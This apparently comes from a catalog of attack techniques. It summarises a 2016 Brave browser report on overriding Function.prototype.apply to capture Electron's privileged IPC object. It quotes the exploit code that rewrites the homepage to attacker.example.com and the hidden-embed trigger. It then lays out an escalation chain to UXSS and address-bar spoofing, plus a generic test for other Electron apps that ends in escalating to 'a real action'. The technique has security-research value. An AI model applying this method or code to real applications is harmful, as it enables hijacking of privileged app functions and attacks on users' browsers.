THE ATTACKER'S OVERRIDE, verbatim: `Function.prototype.apply=function(ipc){ ipc.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'); }`. THE TRIGGER, verbatim: `<div style="visibility:hidden"><embed src=".swf"></embed></div>` — a hidden embed forces the browser's IPC plumbing to invoke the overridden `apply`, which fires the attacker's `ipc.send`. THE OBSERVED IMPACT, verbatim: "See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`." plus "an attacker can do UXSS and address bar spoofing using this bug" (credited PoC #187542). DETECTION SIGNAL: an Electron/Chromium desktop app whose renderer can run attacker JS (XSS, an in-app webview, a custom-protocol handler, a page the app loads); app source (`app.asar`, the JS bundle) containing `Function.prototype.apply`/`Function.prototype.call` used to invoke a privileged object, or `setHiddenValue('ipc', ...)`, or an `arguments[0]`/`arguments[1]` passed through `apply`; any `ipcRenderer`/`require`/`process` reference reachable from renderer JS. CHAIN: attacker JS runs in the renderer (primitive: XSS or a page the app loads) -> redefine `Function.prototype.apply` (primitive: JS built-ins are writable) -> the app's own shim calls `.apply(ipcRenderer, arguments)`, handing the privileged bridge object to the override (escalation: the bridge leaks into attacker JS) -> `ipc.send("dispatch-action", <attacker JSON>)` (escalation: arbitrary IPC message) -> change browser settings / UXSS / address-bar spoofing (impact: client-side code execution in the browser's privileged context; Brave rated Critical). TRANSFERABLE TEST: in any Electron/Chromium desktop app's renderer (or via an XSS in it), run `Function.prototype.apply = function(a){ try{ console.log(a && a.constructor && a.constructor.name, Object.keys(a||{})); }catch(e){} };` then trigger the app's own IPC paths (open a menu, change a setting, load a page). If the logged first argument is a privileged bridge object (an `ipcRenderer`-like object with a `send` function), call `a.send('<channel>', <benign JSON>)` and watch the app react; then escalate to a real action. Rule: **if the app's own code invokes a privileged object through `Function.prototype.apply`/`call`, redefining that built-in hands the bridge to attacker JS — the override's first argument IS the privileged object.** WHY IT IS A NEW GENERAL METHOD: 0 hits across all three write targets for `188086`, `Function.prototype`, `prototype.call`, `ipcRenderer`, `setHiddenValue`, `atom.v8`, `EventEmitter`, `ipc.send`, `privileged bridge`; the pre-existing Electron material (§12.3 Slack HTMLi -> Electron RCE, #1087489 Shopify `.env`, the loopback-WebSocket -> desktop-command entry ~ledger 2502) is HTML injection / a web page reaching a loopback port, not a JS built-in override capturing the privileged IPC object. FRESHNESS CAVEAT: 2016 report — Brave's atom/Electron internals have changed; the transferable part is the built-in-override-to-capture-a-privileged-object pattern. Slot 17.453.
